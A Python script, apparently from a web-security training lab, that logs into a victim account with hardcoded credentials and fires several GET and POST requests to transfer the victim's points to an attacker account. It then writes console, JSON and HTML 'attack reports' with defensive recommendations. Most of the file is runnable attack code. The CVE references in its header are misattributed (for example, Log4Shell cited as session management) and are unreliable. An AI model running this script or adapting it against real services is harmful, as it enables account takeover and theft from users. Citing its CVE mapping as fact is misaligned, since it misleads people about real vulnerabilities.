"""
🎯 Automated Point Transfer Attack Tool
=====================================

⚠️  SECURITY ANALYSIS & CVE INFORMATION ⚠️
===========================================

🎯 Attack Type: Automated Unauthorized Point Transfer
📊 Risk Level: HIGH (CVSS 3.1: 7.8)
🔍 CVE References:
   - CVE-2021-44228 (Session Management + Automated Attacks)
   - CVE-2020-35489 (Web App Automated Point Transfer)
   - CVE-2019-17596 (PHP Session Hijacking)
   - CVE-2018-12613 (Automated Transaction Manipulation)
   - CVE-2017-8295 (Authentication Bypass in Transfers)

🚨 VULNERABILITY ASSESSMENT:
============================
CVSS 3.1 Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H
- Attack Vector: Network (원격 자동화 공격)
- Attack Complexity: Low (간단한 자동화)
- Privileges Required: Low (일반 사용자 권한 필요)
- User Interaction: None (완전 자동화)
- Scope: Unchanged (동일 컴포넌트 내)
- Confidentiality: None (정보 노출 없음)
- Integrity: High (포인트 데이터 변조)
- Availability: High (서비스 남용 가능)

📈 Base Score: 7.8 (HIGH RISK)

⚡ ATTACK MECHANISM:
====================
1. 공격자가 피해자 계정 정보 획득 (bob/bobby123)
2. 자동화 스크립트가 피해자로 로그인
3. 다양한 HTTP 메서드로 포인트 전송 시도
4. 서버 응답 분석하여 성공/실패 판단
5. 공격자 계정으로 포인트 자동 이체 완료

🛡️  COUNTERMEASURES:
====================
1. Rate Limiting on Transfer Actions
2. Two-Factor Authentication (2FA)
3. Transaction Limits per Session
4. IP-based Anomaly Detection
5. User Behavior Analysis (UBA)

"""

import requests
import time
import os
import json
from datetime import datetime


class AutoPointTransferAttacker:
    """자동화된 포인트 탈취 공격 도구"""

    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.hacker_id = "13"
        self.hacker_username = 'hacker'
        self.bob_username = 'bob'
        self.bob_password = 'bobby123'
        self.target_points = 50

        # 보안 분석 정보
        self.vulnerability_info = {
            "attack_type": "Automated Point Transfer",
            "cvss_score": 7.8,
            "risk_level": "HIGH",
            "cve_references": [
                "CVE-2021-44228", "CVE-2020-35489", "CVE-2019-17596",
                "CVE-2018-12613", "CVE-2017-8295"
            ],
            "impact_areas": ["Financial Fraud", "Account Takeover", "Service Abuse"]
        }

        # 세션 설정
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

        # 프록시 설정 처리
        original_proxy = os.environ.get('ALL_PROXY')
        if original_proxy:
            self.session.proxies.update({
                'http': original_proxy,
                'https': original_proxy
            })
            print(f"[+] 프록시 사용: {original_proxy}")

        # 공격 통계
        self.attack_stats = {
            "start_time": datetime.now(),
            "login_attempts": 0,
            "transfer_attempts": 0,
            "successful_transfers": 0,
            "total_points_stolen": 0
        }

    def print_attack_banner(self):
        """공격 배너 출력"""
        print("🔥" * 25)
        print("   AUTO POINT TRANSFER ATTACK")
        print("🔥" * 25)
        print(f"🎯 Target: {self.base_url}")
        print(f"👤 Victim: {self.bob_username}")
        print(f"🏴‍☠️ Attacker: hacker (ID: {self.hacker_id})")
        print(f"💰 Target Amount: {self.target_points} points")
        print(f"⚡ CVSS Score: {self.vulnerability_info['cvss_score']} (HIGH)")
        print("🔥" * 25)

    def login_as_bob(self):
        """Bob 계정으로 자동 로그인"""
        print("\n[PHASE 1] 🔓 Victim Account Login")
        print("=" * 35)

        self.attack_stats["login_attempts"] += 1

        login_data = {
            'username': self.bob_username,
            'password': self.bob_password
        }

        try:
            print(f"[*] Attempting login as {self.bob_username}...")
            response = self.session.post(f"{self.base_url}/login.php", data=login_data)

            if any(indicator in response.text.lower()
                   for indicator in ['logout', 'profile', 'points']):
                print(f"✅ Login successful as {self.bob_username}")
                print("🎯 Victim session established - ready for automated transfer")
                return True
            else:
                print("❌ Login failed - invalid credentials or server error")
                return False

        except Exception as e:
            print(f"❌ Login error: {e}")
            return False

    def execute_automated_transfer(self):
        """자동화된 포인트 전송 실행"""
        print("\n[PHASE 2] 💸 Automated Point Transfer")
        print("=" * 40)
        print("⚡ Executing multiple transfer methods...")

        # 다양한 전송 방법 (원래 코드 기반)
        transfer_methods = [
            {
                'name': '🎯 GET Parameter Attack',
                'type': 'GET',
                'url': f"{self.base_url}/profile.php?receiver_id={self.hacker_id}&points={self.target_points}&send_gift=1&message=auto_transfer"
            },
            {
                'name': '📡 POST Form Attack',
                'type': 'POST',
                'url': f"{self.base_url}/profile.php",
                'data': {
                    'receiver_id': self.hacker_id,
                    'points': self.target_points,
                    'send_gift': '1',
                    'gift_type': 'coffee',
                    'message': '제가 가져갑니다~'
                }
            },
            {
                'name': '🔄 Alternative POST Method',
                'type': 'POST',
                'url': f"{self.base_url}/profile.php",
                'data': {
                    'to_user_id': self.hacker_id,
                    'amount': self.target_points,
                    'gift_type': 'flower',
                    'send_gift': '1',
                    'message': 'Auto transfer'
                }
            },
            {
                'name': '💎 Premium Gift Method',
                'type': 'POST',
                'url': f"{self.base_url}/profile.php",
                'data': {
                    'receiver_id': self.hacker_id,
                    'points': self.target_points,
                    'gift_type': 'diamond',
                    'send_gift': 1,
                    'message': '제 돈입니다 대머리님'
                }
            }
        ]

        successful_transfers = 0

        for i, method in enumerate(transfer_methods, 1):
            self.attack_stats["transfer_attempts"] += 1

            print(f"\n[METHOD {i}] {method['name']}")
            print(f"    Target: hacker (ID: {self.hacker_id})")
            print(f"    Amount: {self.target_points} points")

            try:
                if method['type'] == 'GET':
                    response = self.session.get(method['url'], timeout=20)
                else:
                    response = self.session.post(method['url'], data=method['data'], timeout=20)

                print(f"    HTTP Status: {response.status_code}")

                # 성공 지표 분석 (원래 로직 유지)
                response_text = response.text.lower()

                success_indicators = [
                    '선물을 보냈습니다', 'gift sent', '전송되었습니다',
                    'successfully sent', '포인트가 전송', 'transfer complete'
                ]

                blocking_errors = [
                    'fatal error', 'mysql_connect', 'connection failed',
                    'access denied', 'permission denied', 'unauthorized'
                ]

                has_success = any(indicator in response_text for indicator in success_indicators)
                has_blocking_error = any(error in response_text for error in blocking_errors)
                has_warning_only = 'warning' in response_text and 'fatal error' not in response_text

                # 성공 판정 (원래 로직)
                if has_success and not has_blocking_error:
                    print(f"    ✅ TRANSFER SUCCESSFUL! (Success indicator found)")
                    successful_transfers += 1
                    self.attack_stats["successful_transfers"] += 1
                    self.attack_stats["total_points_stolen"] += self.target_points
                elif not has_blocking_error and has_warning_only:
                    print(f"    ⚠️ LIKELY SUCCESSFUL (Warning only, no fatal errors)")
                    successful_transfers += 1
                    self.attack_stats["successful_transfers"] += 1
                    self.attack_stats["total_points_stolen"] += self.target_points
                elif not has_blocking_error:
                    print(f"    ❓ UNCERTAIN (No errors but no success confirmation)")
                else:
                    print(f"    ❌ FAILED (Fatal error detected)")

                # 응답 샘플 (디버깅용)
                print(f"    Response: {response.text[:200]}...")

            except Exception as e:
                print(f"    ❌ Request failed: {e}")

            time.sleep(2)  # 요청 간 딜레이

        return successful_transfers

    def generate_attack_report(self, successful_transfers):
        """공격 결과 리포트 생성 (Shell + JSON + HTML)"""
        print("\n[PHASE 3] 📊 Attack Results Analysis")
        print("=" * 50)

        end_time = datetime.now()
        duration = end_time - self.attack_stats["start_time"]

        # 공격 성공률 계산
        success_rate = (successful_transfers / self.attack_stats["transfer_attempts"]) * 100 if self.attack_stats[
                                                                                                    "transfer_attempts"] > 0 else 0

        # ========== 1. SHELL 리포트 (콘솔 출력) ==========
        print(f"\n🎯 COMPREHENSIVE ATTACK ANALYSIS")
        print("=" * 60)

        print(f"⏱️ Attack Duration: {duration.total_seconds():.1f} seconds")
        print(f"🎯 Login Success: {self.attack_stats['login_attempts']}/1 attempts")
        print(f"💸 Transfer Attempts: {self.attack_stats['transfer_attempts']}")
        print(f"✅ Successful Transfers: {successful_transfers}")
        print(f"📈 Success Rate: {success_rate:.1f}%")

        if successful_transfers > 0:
            print(f"💰 Total Points Stolen: {self.attack_stats['total_points_stolen']}")
            print(f"🚨 ATTACK STATUS: SUCCESSFUL")
            print(f"🎯 Victim Impact: Financial loss, account compromise")

            # CVE 분석 결과
            print(f"\n🔍 Security Analysis:")
            print(f"   • Vulnerability Type: Automated Financial Transaction")
            print(f"   • CVSS Score: {self.vulnerability_info['cvss_score']} (HIGH)")
            print(f"   • Related CVEs: {', '.join(self.vulnerability_info['cve_references'][:3])}")

            # 보안 권고사항
            print(f"\n🛡️ Security Recommendations:")
            recommendations = [
                "Implement rate limiting on financial transactions",
                "Add two-factor authentication for transfers",
                "Monitor for automated/scripted behavior",
                "Set daily/hourly transfer limits",
                "Log and alert on multiple rapid transfers"
            ]
            for i, rec in enumerate(recommendations, 1):
                print(f"   {i}. {rec}")

        else:
            print(f"🛡️ ATTACK STATUS: FAILED")
            print(f"✅ Application appears to be protected against automated transfers")

        # ========== 2. JSON 리포트 생성 ==========
        print(f"\n📄 Generating JSON Report...")

        json_report = {
            "report_metadata": {
                "report_type": "Automated Point Transfer Attack",
                "generated_at": end_time.isoformat(),
                "tool_version": "1.0"
            },
            "target_information": {
                "application_url": self.base_url,
                "victim_account": self.bob_username,
                "attacker_id": self.hacker_id,
                "target_points": self.target_points
            },
            "vulnerability_analysis": {
                "attack_type": self.vulnerability_info['attack_type'],
                "cvss_score": self.vulnerability_info['cvss_score'],
                "risk_level": self.vulnerability_info['risk_level'],
                "cve_references": self.vulnerability_info['cve_references'],
                "impact_areas": self.vulnerability_info['impact_areas']
            },
            "attack_statistics": {
                "start_time": self.attack_stats['start_time'].isoformat(),
                "end_time": end_time.isoformat(),
                "duration_seconds": duration.total_seconds(),
                "login_attempts": self.attack_stats['login_attempts'],
                "transfer_attempts": self.attack_stats['transfer_attempts'],
                "successful_transfers": successful_transfers,
                "success_rate_percent": success_rate,
                "total_points_stolen": self.attack_stats['total_points_stolen']
            },
            "detailed_methods": getattr(self.attack_stats, 'attack_methods', []),
            "risk_assessment": {
                "is_vulnerable": successful_transfers > 0,
                "risk_score": self.vulnerability_info['cvss_score'],
                "vulnerability_confirmed": successful_transfers > 0
            },
            "recommendations": [
                "Implement CSRF tokens for all financial transactions",
                "Add rate limiting on point transfer operations",
                "Require two-factor authentication for transfers",
                "Implement transaction amount limits per session",
                "Add user behavior analysis (UBA) to detect automation",
                "Log and monitor all financial transactions"
            ]
        }

        json_filename = f"attack_report_{int(time.time())}.json"
        with open(json_filename, 'w', encoding='utf-8') as f:
            json.dump(json_report, f, indent=2, ensure_ascii=False, default=str)

        print(f"✅ JSON Report saved: {json_filename}")

        # ========== 3. HTML 리포트 생성 ==========
        print(f"📄 Generating HTML Report...")

        # 위험도에 따른 색상/상태 결정
        if successful_transfers > 0:
            risk_color = "#dc3545"  # 빨간색
            status_text = "VULNERABLE"
            status_icon = "⚠️"
        else:
            risk_color = "#28a745"  # 초록색
            status_text = "SECURE"
            status_icon = "🛡️"

        html_content = f"""<!DOCTYPE html>
    <html lang="ko">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Automated Point Transfer Attack Report</title>
        <style>
            body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background: #f8f9fa; }}
            .container {{ max-width: 1200px; margin: 0 auto; background: white; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }}
            .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; text-align: center; border-radius: 10px 10px 0 0; }}
            .header h1 {{ margin: 0; font-size: 2.5em; }}
            .content {{ padding: 30px; }}
            .status-banner {{ background: {risk_color}; color: white; padding: 20px; border-radius: 8px; text-align: center; font-size: 1.5em; margin: 20px 0; }}
            .section {{ margin: 20px 0; padding: 20px; background: #f8f9fa; border-radius: 8px; border-left: 5px solid #667eea; }}
            .section h2 {{ margin-top: 0; color: #667eea; }}
            .stats-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }}
            .stat-card {{ background: white; padding: 20px; border-radius: 8px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
            .stat-value {{ font-size: 2em; font-weight: bold; color: #667eea; }}
            .stat-label {{ color: #666; margin-top: 5px; }}
            .cve-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 10px; }}
            .cve-item {{ background: #fff3cd; padding: 10px; border-radius: 5px; text-align: center; font-family: monospace; border: 1px solid #ffeaa7; }}
            .rec-list {{ counter-reset: rec-counter; }}
            .rec-item {{ counter-increment: rec-counter; background: white; margin: 10px 0; padding: 15px; border-radius: 8px; border-left: 5px solid #17a2b8; }}
            .rec-item::before {{ content: counter(rec-counter) ". "; font-weight: bold; color: #17a2b8; }}
            .footer {{ background: #343a40; color: white; padding: 20px; text-align: center; border-radius: 0 0 10px 10px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🎯 Attack Analysis Report</h1>
                <p>Automated Point Transfer Vulnerability Assessment</p>
                <p>Generated: {end_time.strftime('%Y-%m-%d %H:%M:%S')}</p>
            </div>

            <div class="content">
                <div class="status-banner">
                    {status_icon} APPLICATION STATUS: {status_text}
                </div>

                <div class="section">
                    <h2>📊 Attack Statistics</h2>
                    <div class="stats-grid">
                        <div class="stat-card">
                            <div class="stat-value">{self.attack_stats['transfer_attempts']}</div>
                            <div class="stat-label">Methods Tested</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-value">{successful_transfers}</div>
                            <div class="stat-label">Successful Attacks</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-value">{success_rate:.1f}%</div>
                            <div class="stat-label">Success Rate</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-value">{self.attack_stats['total_points_stolen']}</div>
                            <div class="stat-label">Points Stolen</div>
                        </div>
                    </div>
                </div>

                <div class="section">
                    <h2>🎯 Target Information</h2>
                    <p><strong>Application URL:</strong> {self.base_url}</p>
                    <p><strong>Victim Account:</strong> {self.bob_username}</p>
                    <p><strong>Attacker ID:</strong> {self.hacker_id}</p>
                    <p><strong>Target Points:</strong> {self.target_points}</p>
                    <p><strong>Attack Duration:</strong> {duration.total_seconds():.1f} seconds</p>
                </div>

                <div class="section">
                    <h2>🔍 Vulnerability Analysis</h2>
                    <p><strong>Attack Type:</strong> {self.vulnerability_info['attack_type']}</p>
                    <p><strong>CVSS 3.1 Score:</strong> {self.vulnerability_info['cvss_score']} ({self.vulnerability_info['risk_level']})</p>
                    <p><strong>Related CVEs:</strong></p>
                    <div class="cve-grid">"""

        # CVE 리스트 추가
        for cve in self.vulnerability_info['cve_references']:
            html_content += f'<div class="cve-item">{cve}</div>'

        html_content += f"""</div>
                </div>

                <div class="section">
                    <h2>🛡️ Security Recommendations</h2>
                    <div class="rec-list">
                        <div class="rec-item">Implement CSRF tokens for all financial transactions</div>
                        <div class="rec-item">Add rate limiting on point transfer operations</div>
                        <div class="rec-item">Require two-factor authentication for transfers</div>
                        <div class="rec-item">Implement transaction amount limits per session</div>
                        <div class="rec-item">Add user behavior analysis (UBA) to detect automation</div>
                        <div class="rec-item">Log and monitor all financial transactions</div>
                    </div>
                </div>
            </div>

            <div class="footer">
                <p>🔒 Security Assessment Tool | Educational Purpose Only</p>
                <p>Report generated at {end_time.strftime('%Y-%m-%d %H:%M:%S')}</p>
            </div>
        </div>
    </body>
    </html>"""

        html_filename = f"attack_report_{int(time.time())}.html"
        with open(html_filename, 'w', encoding='utf-8') as f:
            f.write(html_content)

        print(f"✅ HTML Report saved: {html_filename}")

        # ========== 4. 리포트 생성 완료 ==========
        print(f"\n📁 All reports generated successfully:")
        print(f"   • Shell Output: ✅ Displayed above")
        print(f"   • JSON Report: ✅ {json_filename}")
        print(f"   • HTML Report: ✅ {html_filename}")
        print(f"\n💡 Open {html_filename} in your browser for visual report!")

        return successful_transfers > 0

    def run_automated_attack(self):
        """전체 자동화 공격 실행"""
        try:
            # 1. 공격 배너
            self.print_attack_banner()

            # 2. Bob 로그인
            if not self.login_as_bob():
                print("\n❌ Attack failed - cannot login as victim")
                return False

            # 3. 자동화된 포인트 전송
            successful_transfers = self.execute_automated_transfer()

            # 4. 결과 분석 및 리포트
            attack_success = self.generate_attack_report(successful_transfers)

            # 5. 최종 결과
            print(f"\n🏆 FINAL ATTACK RESULT")
            print("=" * 30)

            if attack_success:
                print("🚨 AUTOMATED ATTACK SUCCESSFUL!")
                print(f"💸 Bob's points automatically transferred to hacker")
                print(f"🎯 Check hacker account for stolen points!")
            else:
                print("🛡️ Automated attack failed or blocked")
                print("✅ Target application may have security protections")

            return attack_success

        except Exception as e:
            print(f"❌ Attack sequence failed: {e}")
            import traceback
            traceback.print_exc()
            return False


if __name__ == "__main__":
    import sys

    print(__doc__)  # 보안 분석 정보 출력

    if len(sys.argv) < 2:
        print("Usage: python3 1124_CSRF_Auto.py <target_url>")
        print("Example: python3 1124_CSRF_Auto.py http://3.35.218.180/")
        sys.exit(1)

    target = sys.argv[1]

    print("🚀 Automated Point Transfer Attack Starting...")
    print(f"🎯 Target: {target}")
    print("⚖️ Legal Notice: Educational and authorized testing only!")

    # 자동화 공격 실행
    attacker = AutoPointTransferAttacker(target)
    success = attacker.run_automated_attack()

    if success:
        print("\n✅ Automated point theft completed successfully!")
        print("💰 Verify stolen points in hacker account!")
    else:
        print("\n❌ Automated attack was unsuccessful.")